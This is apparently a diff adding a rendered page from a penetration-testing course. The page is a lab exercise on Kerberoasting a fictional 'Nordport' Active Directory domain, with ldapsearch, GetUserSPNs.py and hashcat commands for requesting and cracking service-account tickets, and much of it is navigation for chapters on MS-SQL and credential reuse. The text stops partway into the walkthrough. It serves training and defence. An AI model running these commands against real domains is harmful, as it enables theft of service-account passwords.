+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/03_MSSQL_Manual_Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.3 -- MS-SQL Manual Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/04_MSSQL_Credential_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.4 -- MS-SQL Credential Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/05_MSSQL_Basic_Query_Execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.5 -- MS-SQL Basic Query Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/06_MSSQL_xp_cmdshell_Activation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.6 -- MS-SQL xp_cmdshell Activation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/07_MSSQL_File_System_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.7 -- MS-SQL File System Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/08_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH07 -- LDAP Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH07 -- LDAP Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/01_LDAP_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.1 -- LDAP Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/02_LDAP_Anonymous_Bind_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.2 -- LDAP Anonymous Bind Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/03_LDAP_Base_DN_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.3 -- LDAP Base DN Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/04_LDAP_User_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.4 -- LDAP User Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/05_LDAP_Group_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.5 -- LDAP Group Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/06_LDAP_Comprehensive_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.6 -- LDAP Comprehensive Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH08 -- Credential Reuse
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH08 -- Credential Reuse
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/01_Single_Service_Credential_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.1 -- Single Service Credential Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/02_Cross_Service_Credential_Reuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.2 -- Cross-Service Credential Reuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/03_Multi_Service_Credential_Reuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.3 -- Multi-Service Credential Reuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/04_Credential_Discovery_and_Reuse_Chain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.4 -- Credential Discovery and Reuse Chain
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/05_CME_Credential_Reuse_Automation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.5 -- CME Credential Reuse Automation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH09 -- Assessment
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH09 -- Assessment
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/01_Windows_Network_Assessment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 9.1 -- Windows Network Assessment
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/02_Multi_Service_Exploitation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 9.2 -- Multi-Service Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/03_Complete_Windows_Penetration_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 9.3 -- Complete Windows Penetration Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/04_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kerberoast-on-the-wire" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoast on the Wire
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tgs-rep-hash-mode-lookup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TGS-REP Hash Mode Lookup
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-spns-and-why-service-tickets-are-crackable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: SPNs and Why Service Tickets Are Crackable
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: SPNs and Why Service Tickets Are Crackable">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-this-is-attackable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why this is attackable
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-tgs-rep-hash-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The TGS-REP hash format
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-ldap-filter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The LDAP filter
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getuserspnspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GetUserSPNs.py
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat-mode-13100" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        hashcat mode 13100
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#forcing-rc4-faster-cracking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Forcing RC4 (faster cracking)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-list-all-spn-bearing-user-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: List All SPN-Bearing User Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-request-the-tgs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Request the TGS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-crack-with-hashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Crack with hashcat
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-submit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Submit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-33-kerberoast">Exercise 3.3: Kerberoast</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Kerberoast is the most reliable AD attack on the offensive checklist. Any authenticated domain user can request a service ticket (TGS-REP) for any account that has a Service Principal Name registered. The TGS-REP is encrypted with the service account's password-derived key. Weak password = crackable hash. The traffic looks identical to legitimate authentication; the SOC has no signal until the cracked password is used elsewhere.</p>
+<p>Exercise 3.3 asks you to find one Kerberoast-able service account in Nordport's directory and crack its TGS-REP. The recovered password is your flag.</p>
+<p><strong>Tools required:</strong> <code>impacket-GetUserSPNs</code> (often <code>GetUserSPNs.py</code>), <code>hashcat</code>, <code>ldapsearch</code>. Pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "If a service account has an SPN, any authenticated domain user can ask the KDC for a service ticket. The ticket is encrypted with the service account's password hash. Quiet attack, totally normal-looking traffic."</p>
+<p>Per-student: <code>svc_kerb_&lt;token&gt;</code> has an SPN of the form <code>MSSQLSvc/eng-build-NN.corp.nordport.local:1433</code>. Crack its TGS-REP. The plaintext is the flag.</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>j.chen</code></td>
+<td><code>Welcome2026#</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Enumerate accounts with registered SPNs</li>
+<li>Request a TGS-REP for <code>svc_kerb_&lt;token&gt;</code></li>
+<li>Crack the TGS-REP with hashcat mode 13100</li>
+<li>Submit the plaintext</li>
+</ul>
+<h3 id="kerberoast-on-the-wire">Kerberoast on the Wire</h3>
+<p>The diagram below traces the request from any authenticated user to a crackable hash. No special privilege is required; that is the entire reason the attack is so reliable.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    autonumber
+    participant C as Attacker (j.chen, any user)
+    participant K as KDC (corp-dc01)
+
+    Note over C,K: Step 1 -- attacker already has a TGT from earlier kinit
+    C-&gt;&gt;K: TGS-REQ&lt;br/&gt;sname=MSSQLSvc/eng-build-01:1433
+    K--&gt;&gt;C: TGS-REP&lt;br/&gt;service ticket enc with svc_kerb_password_key
+    Note right of C: $krb5tgs$23$*svc_kerb_&lt;token&gt;$REALM$SPN*$challenge$cipher
+    Note over C: hashcat -m 13100 ... rockyou + best64
+    Note over C: plaintext password recovered</code></pre>
+<h3 id="tgs-rep-hash-mode-lookup">TGS-REP Hash Mode Lookup</h3>
+<p>The mode you launch depends on the etype the KDC returned. The table below tells you which hashcat mode matches each prefix.</p>
+<table>
+<thead>
+<tr>
+<th>TGS-REP prefix</th>
+<th>Etype</th>
+<th>Algorithm</th>
+<th>Hashcat mode</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$krb5tgs$23$</code></td>
+<td>23</td>
+<td>RC4-HMAC</td>
+<td>13100</td>
+</tr>
+<tr>
+<td><code>$krb5tgs$17$</code></td>
+<td>17</td>
+<td>AES128</td>
+<td>19600</td>
+</tr>
+<tr>
+<td><code>$krb5tgs$18$</code></td>
+<td>18</td>
+<td>AES256</td>
+<td>19700</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="background-spns-and-why-service-tickets-are-crackable">Background: SPNs and Why Service Tickets Are Crackable</h2>
+<p>A <strong>Service Principal Name</strong> (SPN) is a string that identifies a service instance in the Kerberos namespace. The format is <code>&lt;service-class&gt;/&lt;host&gt;[:port]</code>, for example <code>MSSQLSvc/db01.corp.local:1433</code> or <code>HTTP/web01.corp.local</code>. When a client wants a ticket to talk to that service, it sends a TGS-REQ with that SPN as the <code>sname</code>; the KDC looks up which account is associated with the SPN, encrypts the service ticket with that account's password-derived key, and returns the ticket in the TGS-REP.</p>
+<h3 id="why-this-is-attackable">Why this is attackable</h3>
+<p>The KDC does not check whether the requesting user has any actual relationship to the service. Any authenticated domain user can request a TGS for any SPN. The KDC issues the TGS-REP. The ticket is encrypted with the service account's NT hash (or AES key). An attacker captures the TGS-REP, brute-forces the encryption offline, and recovers the service account password.</p>
+<p>The defender's only mitigation is <strong>strong service account passwords</strong>. Specifically:</p>
+<ul>
+<li><strong>Group Managed Service Accounts (gMSAs)</strong>: Windows generates a 240-byte randomly-rotated password every 30 days. Cracking is computationally infeasible.</li>
+<li><strong>Standalone Managed Service Accounts (sMSAs)</strong>: precursor to gMSAs, similar properties.</li>
+<li><strong>Long human-set passwords</strong>: 25+ characters with diverse character classes makes the hash impractical to crack in a useful timeframe.</li>
+</ul>
+<p>In practice, most environments have at least one weak service account password. SQL Server installations from circa 2010 used <code>Password!23</code> patterns. SCCM agents used short fixed credentials. CI/CD service accounts often share a password reused for a decade.</p>
+<h3 id="the-tgs-rep-hash-format">The TGS-REP hash format</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$krb5tgs$23$*svc_kerb_a7f3$CORP.NORDPORT.LOCAL$MSSQLSvc/eng-build-01.corp.nordport.local:1433*$&lt;challenge&gt;$&lt;encrypted_blob&gt;
+</code></pre></div>
+<p><code>23</code> is RC4-HMAC. Hashcat mode is <strong>13100</strong>. AES128 is etype 17 (mode 19600), AES256 is etype 18 (mode 19700); the prefix changes accordingly.</p>
+<h3 id="the-ldap-filter">The LDAP filter</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>(&amp;(samAccountType=805306368)(servicePrincipalName=*))
+</code></pre></div>
+<p><code>samAccountType=805306368</code> is "user object." <code>servicePrincipalName=*</code> means "has at least one SPN." Computer objects have SPNs too (machine accounts) but their passwords are 240 random bytes and are not crackable; filtering on <code>samAccountType=805306368</code> keeps the result list focused on user-level service accounts.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="ldap-enumeration">LDAP enumeration</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;dc&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span><span class="s2">&quot;(&amp;(samAccountType=805306368)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span>sAMAccountName<span class="w"> </span>servicePrincipalName
+</code></pre></div>
+<h3 id="getuserspnspy">GetUserSPNs.py</h3>
+<p>Enumerate and request all in one shot:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>GetUserSPNs.py<span class="w"> </span>corp.nordport.local/j.chen:<span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc&gt;<span class="w"> </span>-request<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>-outputfile<span class="w"> </span>tgs.hash
+</code></pre></div>
+<p>Or target a specific user:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>GetUserSPNs.py<span class="w"> </span>corp.nordport.local/j.chen:<span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span>-request-user<span class="w"> </span><span class="s2">&quot;svc_kerb_&lt;token&gt;&quot;</span><span class="w"> </span>-outputfile<span class="w"> </span>tgs.hash
+</code></pre></div>
+<h3 id="hashcat-mode-13100">hashcat mode 13100</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>tgs.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span>-r<span class="w"> </span>/usr/share/hashcat/rules/best64.rule
+</code></pre></div>
+<p>For AES TGS-REPs, swap to <code>-m 19600</code> or <code>-m 19700</code>. Modern DCs default to AES; RC4 cracking only works if the service account explicitly permits RC4 (<code>msDS-SupportedEncryptionTypes</code> allows it) or the domain default still allows it.</p>
+<h3 id="forcing-rc4-faster-cracking">Forcing RC4 (faster cracking)</h3>
+<p>You can request the TGS with <code>etype</code> restricted to RC4:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>GetUserSPNs.py<span class="w"> </span>corp.nordport.local/j.chen:<span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>tgs.hash
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># GetUserSPNs.py defaults to RC4 when the account allows it; if you get AES anyway,</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># set etype on the request manually with impacket scripts that expose the option.</span>
+</code></pre></div>
+<p>If the domain or account denies RC4, you get AES back and crack with the AES mode.</p>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-list-all-spn-bearing-user-accounts">Step 1: List All SPN-Bearing User Accounts</h3>
+<p>The first move is to find every Kerberoast candidate the directory holds. The LDAP filter excludes computer accounts (whose passwords are 240 random bytes and uncrackable) and returns only the user-class accounts that have at least one SPN registered.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Enumerate via LDAP</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://&lt;dc_ip&gt;<span class="w"> </span><span class="se">\</span>
